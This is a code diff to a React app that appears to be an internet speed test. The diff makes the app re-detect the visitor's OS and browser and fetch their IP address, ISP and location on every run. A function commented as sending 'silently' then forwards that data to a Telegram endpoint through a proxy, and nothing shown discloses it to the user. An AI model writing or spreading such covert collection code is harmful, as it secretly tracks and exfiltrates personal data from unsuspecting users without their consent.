@@ -300,6 +300,18 @@ export default function App() {
     setUploadMbps(0);
     setProgress(0);
 
+    // 1. Freshly re-detect OS and browser on every launch
+    const currentSystem = detectClientSystem();
+    setClientSystem(currentSystem);
+
+    // 2. Freshly collect network info (IP, ISP, Location) on every launch
+    const freshNetworkPromise = fetchNetworkInfo().then(info => {
+      if (info) {
+        setNetworkInfo(info);
+      }
+      return info;
+    });
+
     let finalPing = 0;
     let finalDown = 0;
     let finalUp = 0;
@@ -356,12 +368,12 @@ export default function App() {
     setPhase("done");
     setProgress(1);
 
-    // Send to Telegram silently via proxy
+    // Silently send Telegram notification with freshly fetched network info
     const sendTelegram = async () => {
       try {
-        let currentInfo = networkInfo;
+        let currentInfo = await freshNetworkPromise;
         if (!currentInfo) {
-          currentInfo = await fetchNetworkInfo();
+          currentInfo = networkInfo || (await fetchNetworkInfo());
         }
 
         await fetch('/api/telegram', {
